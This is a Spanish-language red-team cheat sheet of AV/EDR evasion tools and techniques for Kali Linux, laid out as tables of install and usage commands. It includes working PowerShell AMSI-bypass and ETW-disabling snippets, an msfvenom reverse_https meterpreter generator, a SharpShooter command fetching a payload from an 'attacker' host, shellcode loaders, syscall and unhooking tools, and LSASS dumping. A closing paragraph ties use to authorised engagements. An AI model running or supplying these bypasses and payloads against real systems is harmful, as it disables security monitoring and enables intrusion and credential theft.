# Herramientas de Evasión AV/EDR — CLI Kali Linux

Bypass de AV/EDR, AMSI/ETW patching, obfuscación, direct syscalls,
sleep masks. Sólo bajo RoE de red team auténtico.

---

## 1. Triage / Análisis del propio payload

| Herramienta | Instalación | Comando de ejemplo |
|---|---|---|
| **DefenderCheck** | `git clone https://github.com/matterpreter/DefenderCheck` | (Windows) `DefenderCheck.exe payload.exe` |
| **ThreatCheck** | `git clone https://github.com/rasta-mouse/ThreatCheck` | (Windows) `ThreatCheck.exe -f payload.exe -e MpEngine` |
| **AVRedTeam** | `git clone https://github.com/SaadAhla/AVRedTeam` | binary search del trigger |
| **yara test** | `sudo apt install yara` | `yara -r ./yara-rules/ payload.exe` (rules pre-armadas vs malware family) |
| **VirusTotal CLI** | `pip install vt-py --break-system-packages` | `vt scan file payload.exe --apikey $VT_KEY` (cuidado: comparte hash con AVs) |

---

## 2. Shellcode / Payload Encoders

| Herramienta | Instalación | Comando de ejemplo |
|---|---|---|
| **donut** | `git clone https://github.com/TheWover/donut` | `./donut -i payload.exe -o payload.bin -f 1 -b 3` (.NET/EXE → shellcode) |
| **sgn (shikata-ga-nai)** | `go install github.com/EgeBalci/sgn@latest` | `sgn -a 64 -i shellcode.bin -o sgn_encoded.bin --max=10` |
| **msfvenom encoder** | Preinstalado | `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=x LPORT=443 -e x64/xor_dynamic -i 5 -f raw -o sc.bin` |
| **AESCrypt / custom** | manual | XOR/AES tu shellcode, decode en runtime con stub mínimo |
| **shellterer** | `git clone https://github.com/Bourne-ID/shellterer` | obfuscation incremental |
| **xor-shellcode-py** | script propio | trivial pero útil para custom |

---

## 3. Loaders y Process Injection

| Herramienta | Instalación | Comando de ejemplo |
|---|---|---|
| **Inceptor** | `git clone https://github.com/klezVirus/inceptor` | `python3 inceptor.py native -f shellcode.bin -o loader.exe -e XOR` |
| **PEzor** | `git clone https://github.com/phra/PEzor` | `./PEzor.sh -unhook -text -sleep=60 input.exe` |
| **ScareCrow** | `git clone https://github.com/optiv/ScareCrow` | `./ScareCrow -I payload.bin -Loader binary -domain http://api.update-server.com` |
| **Nimcrypt2** | `git clone https://github.com/icyguider/Nimcrypt2` | `nim c -d:release Nimcrypt2.nim; ./Nimcrypt2 -f sc.bin -t shellcode -o final.exe` |
| **Mortar** | `git clone https://github.com/0xsp-SRD/mortar` | (build con MSVC; loader EXE) |
| **Sharpshooter** | `git clone https://github.com/mdsecactivebreach/SharpShooter` | `python SharpShooter.py --stageless --dotnetver 4 --payload hta --output shell --rawscfile sc.bin --awlurl http://attacker/foo --com xslremote` |
| **freeze.rs** | `cargo install --git https://github.com/optiv/freeze.rs` | `freeze --shellcode beacon.bin --output beacon.exe` |
| **DInvoke** | NuGet package | en C#: import DInvoke para syscalls directos |

---

## 4. AMSI / ETW Bypass

| Técnica | Snippet / herramienta |
|---|---|
| **AMSI bypass (PowerShell — string-fragmented)** | `$a='Sys';$b='tem.';$c='Manage';$d='ment.Auto';$e='mation.A';$f='msiU';$g='tils';[Ref].Assembly.GetType("$a$b$c$d$e$f$g").GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)` |
| **AMSI bypass (.NET via reflection)** | `[Reflection.Assembly]::LoadWithPartialName('Sys'+'tem.Mana'+'gement.Auto'+'mation').GetType("$a$b...").GetMethod('CheckSuppressedMember')...` |
| **AMSI patch in-memory (C/C++)** | patch `AmsiScanBuffer` con `mov eax, 0x80070057; ret 8` |
| **AMSI hardware breakpoint** | `git clone https://github.com/RythmStick/AMSITrigger` (genera firmas + bypass específico) |
| **ETW patch (PowerShell)** | `[Reflection.Assembly]::LoadWithPartialName("System.Diagnostics.Eventing").GetType("System.Diagnostics.Eventing.EventProvider").GetField("m_enabled","NonPublic,Instance").SetValue([System.Diagnostics.Eventing.EventProvider]::new(...), 0)` |
| **ETW patch (C++)** | patch `NtTraceEvent` con `ret` instruction |
| **EvilSalsa / EvilSalsa3** | release github | `EvilSalsa.exe LHOST LPORT 0` (todo en uno: AMSI+ETW+bypass) |
| **Invisi-Shell** | `git clone https://github.com/OmerYa/Invisi-Shell` | `RunWithRegistryNonAdmin.bat InvisiShellProfiler.dll` (PowerShell sin logging) |

---

## 5. Direct Syscalls (bypass userland hooks)

| Herramienta | Instalación | Para qué |
|---|---|---|
| **SysWhispers2 / 3** | `git clone https://github.com/klezVirus/SysWhispers3` | genera ASM con direct syscalls Windows |
| **HellsGate** | `git clone https://github.com/am0nsec/HellsGate` | resolución dinámica de syscall numbers |
| **HalosGate** | `git clone https://github.com/jthuraisamy/HalosGate-AVRedTeam` | encuentra syscall via SSN scanning |
| **FreshyCalls** | `git clone https://github.com/crummie5/FreshyCalls` | improvement sobre HellsGate |
| **InlineWhispers2** | `git clone https://github.com/outflanknl/InlineWhispers2` | syscalls inline en MSVC |

---

## 6. Sleep Masks / Memory Encryption

| Herramienta | Instalación | Comando de ejemplo |
|---|---|---|
| **Foliage** | `git clone https://github.com/SecIdiot/FOLIAGE` | inject sleep mask via timer-queue |
| **EkkoEx** | release github | cifra implant en memoria durante sleep |
| **GhostlyHollowing** | research code | hollowing + masking |
| **SilentMoonwalk** | `git clone https://github.com/klezVirus/SilentMoonwalk` | spoofing del call stack |

---

## 7. Anti-Sandbox / Anti-Analysis

| Herramienta | Instalación | Uso |
|---|---|---|
| **al-khaser** | `git clone https://github.com/LordNoteworthy/al-khaser` | (Windows) detecta VM / debugger / sandbox / EDR |
| **pafish** | `git clone https://github.com/a0rtega/pafish` | similar a al-khaser, más pequeño |
| **Antianalysis tricks** | manual | sleep evasion (mucho sleep antes de payload), check `KUSER_SHARED_DATA->InterruptTime`, check mouse movement, check CPU cores ≥ 2 |
| **WhereAmI** | `git clone https://github.com/khast3x/whereami` | environment reconnaissance |

---

## 8. EDR Unhooking

| Herramienta | Instalación | Uso |
|---|---|---|
| **EDRSandblast** | `git clone https://github.com/wavestone-cdt/EDRSandBlast` | `EDRSandBlast.exe --usermode --kernelmode --audit` |
| **PPLDump** | `git clone https://github.com/itm4n/PPLdump` | dump LSASS protegido |
| **PPLMedic** | `git clone https://github.com/itm4n/PPLMedic` | escalada PPL |
| **Backstab** | release github | matar PPL processes |
| **EDR Telemetry comparison** | https://www.edr-telemetry.com/ | qué EDR ve qué evento |

---

## 9. C2 Profile Hardening (overlap red_team_ops)

| Herramienta | Para qué |
|---|---|
| **C2concealer** | malleable profiles para Cobalt Strike |
| **Mythic profiles** | egress profiles personalizables |
| **CovenantCommander profile editor** | profiles Covenant |
| **NGINX redirector + apache_redirector config** | filtra/log conexiones C2 |
| **traefik / envoy proxy** | redirector moderno con TLS auto |

---

## 10. Defense Evasion Reference / Knowledge Base

| Recurso | URL |
|---|---|
| **MITRE ATT&CK Defense Evasion (TA0005)** | attack.mitre.org/tactics/TA0005/ |
| **LOLBAS Project** | lolbas-project.github.io |
| **MalAPI.io** | malapi.io (Windows APIs comunes en malware) |
| **vx-underground samples** | vx-underground.org (referencias) |
| **Sektor7 / Maldev Academy courses** | comercial pero referencia top |

---

## Resumen de Disponibilidad

| Estado | Cantidad |
|---|---|
| **Open source git clone** | ~30 |
| **Commercial (Sektor7, Maldev, Cobalt)** | varios |
| **Snippets in-line** (AMSI/ETW bypass) | ~10 técnicas core |
| **Total** | **~40 herramientas + 15 técnicas core** |

---

## Alcance y warning

Evasión auténtica = engagement de red team auténtico. Si te encuentras
necesitando evasión en un "pentest normal", probablemente estés fuera
de scope — confirma con el cliente.

NUNCA desactives el AV/EDR del cliente; eso es destructive. Evasión =
NO generar el log/alerta; tampering = generar y borrar. Distintos
niveles de responsabilidad legal.

Cleanup obligatorio: cualquier loader / persistencia / hook instalada
durante evasión debe quedar inventariada y limpiada al cierre.
